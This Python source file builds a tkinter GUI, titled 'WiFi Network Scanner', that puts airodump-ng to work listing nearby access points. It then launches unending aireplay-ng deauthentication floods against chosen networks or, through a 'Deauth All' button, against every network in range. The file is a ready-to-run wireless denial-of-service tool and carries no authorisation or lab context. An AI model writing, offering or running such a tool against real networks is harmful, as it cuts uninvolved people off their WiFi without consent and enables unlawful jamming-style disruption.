import tkinter as tk
from tkinter import messagebox
import subprocess
import threading
import time
import csv
import os

scan_thread = None
deauth_thread = None
scanning = False
deauthing = False
wifi_networks = []
output_file = 'Output-01.csv'
channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
airodump_process = None
aireplay_processes = []

def run_airodump():
    global wifi_networks, airodump_process
    wifi_networks = []
    try:
        if os.path.exists(output_file):
            os.remove(output_file)
        airodump_process = subprocess.Popen(['sudo', 'airodump-ng', 'wlan0mon', '-w', 'Output', '--write-interval', '2', '-o', 'csv'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while scanning:
            for channel in channels:
                subprocess.run(['sudo', 'iw', 'dev', 'wlan0mon', 'set', 'channel', str(channel)])
                time.sleep(5)
                read_networks()
                update_gui()
    except Exception as e:
        messagebox.showerror("Error", f"Error running airodump-ng: {e}")

def read_networks():
    global wifi_networks
    wifi_networks = []
    try:
        with open(output_file, 'r') as file:
            reader = csv.reader(file)
            for row in reader:
                if len(row) >= 5 and row[0].startswith(" BSSID"):
                    continue
                if len(row) >= 5:
                    bssid = row[0]
                    essid = row[13] if len(row) > 13 else ""
                    channel = row[3].strip() if len(row) > 3 else ""
                    strength = row[8] if len(row) > 8 else ""
                    if channel.isdigit():
                        channel = int(channel)
                    else:
                        channel = None
                    wifi_networks.append({"BSSID": bssid, "ESSID": essid, "CH": channel, "STRENGTH": strength})
    except Exception as e:
        messagebox.showerror("Error", f"Error reading output: {e}")

def update_gui():
    listbox.delete(0, tk.END)
    for i, network in enumerate(wifi_networks, start=1):
        listbox.insert(tk.END, f"{i}  {network['BSSID']}  {network['ESSID']}  {network['CH']}  {network['STRENGTH']}")

def start_scan():
    global scanning, scan_thread
    if not scanning:
        scanning = True
        scan_thread = threading.Thread(target=run_airodump, daemon=True)
        scan_thread.start()
        start_button.config(state=tk.DISABLED)
        stop_button.config(state=tk.NORMAL)

def stop_scan():
    global scanning, airodump_process
    scanning = False
    if airodump_process:
        airodump_process.terminate()
        airodump_process = None
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

def deauth_network():
    global deauthing, deauth_thread
    selected_indices = listbox.curselection()
    if not selected_indices:
        messagebox.showwarning("Warning", "Please select a network to deauth")
        return
    if deauthing:
        messagebox.showwarning("Warning", "Deauthentication process is already running.")
        return
    deauthing = True
    deauth_thread = threading.Thread(target=deauth_selected, args=(selected_indices,), daemon=True)
    deauth_thread.start()
    stop_deauth_button.config(state=tk.NORMAL)
    deauth_button.config(state=tk.DISABLED)

def deauth_all():
    global deauthing, deauth_thread
    if deauthing:
        messagebox.showwarning("Warning", "Deauthentication process is already running.")
        return
    deauthing = True
    deauth_thread = threading.Thread(target=deauth_all_networks, daemon=True)
    deauth_thread.start()
    stop_deauth_button.config(state=tk.NORMAL)
    deauth_all_button.config(state=tk.DISABLED)

def deauth_selected(selected_indices):
    global aireplay_processes
    for index in selected_indices:
        network = wifi_networks[index]
        bssid = network["BSSID"]
        channel = network["CH"]
        if channel is not None:
            subprocess.run(['sudo', 'iw', 'dev', 'wlan0mon', 'set', 'channel', str(channel)])
            aireplay_process = subprocess.Popen(['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, 'wlan0mon'])
            aireplay_processes.append(aireplay_process)
            time.sleep(1)
    deauthing = False
    stop_deauth_button.config(state=tk.DISABLED)
    deauth_button.config(state=tk.NORMAL)

def deauth_all_networks():
    global aireplay_processes
    for network in wifi_networks:
        bssid = network["BSSID"]
        channel = network["CH"]
        if channel is not None:
            subprocess.run(['sudo', 'iw', 'dev', 'wlan0mon', 'set', 'channel', str(channel)])
            aireplay_process = subprocess.Popen(['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, 'wlan0mon'])
            aireplay_processes.append(aireplay_process)
            time.sleep(1)
    deauthing = False
    stop_deauth_button.config(state=tk.DISABLED)
    deauth_all_button.config(state=tk.NORMAL)

def stop_deauth():
    global deauthing, aireplay_processes
    if deauthing:
        deauthing = False
        for process in aireplay_processes:
            process.terminate()
        aireplay_processes = []
        messagebox.showinfo("Deauthentication", "Deauthentication process has been stopped.")
        stop_deauth_button.config(state=tk.DISABLED)
        deauth_button.config(state=tk.NORMAL)
        deauth_all_button.config(state=tk.NORMAL)
    else:
        messagebox.showwarning("Warning", "No ongoing deauthentication process to stop.")

root = tk.Tk()
root.title("WiFi Network Scanner")

listbox = tk.Listbox(root, width=80, height=20, selectmode=tk.MULTIPLE)
listbox.pack(pady=20)

start_button = tk.Button(root, text="START Scan", command=start_scan)
start_button.pack(side=tk.LEFT, padx=20)

stop_button = tk.Button(root, text="STOP Scan", command=stop_scan, state=tk.DISABLED)
stop_button.pack(side=tk.LEFT, padx=20)

deauth_all_button = tk.Button(root, text="Deauth All", command=deauth_all)
deauth_all_button.pack(side=tk.LEFT, padx=20)

deauth_button = tk.Button(root, text="Deauth Selected", command=deauth_network)
deauth_button.pack(side=tk.LEFT, padx=20)

stop_deauth_button = tk.Button(root, text="Stop Deauth", command=stop_deauth, state=tk.DISABLED)
stop_deauth_button.pack(side=tk.LEFT, padx=20)

root.mainloop()
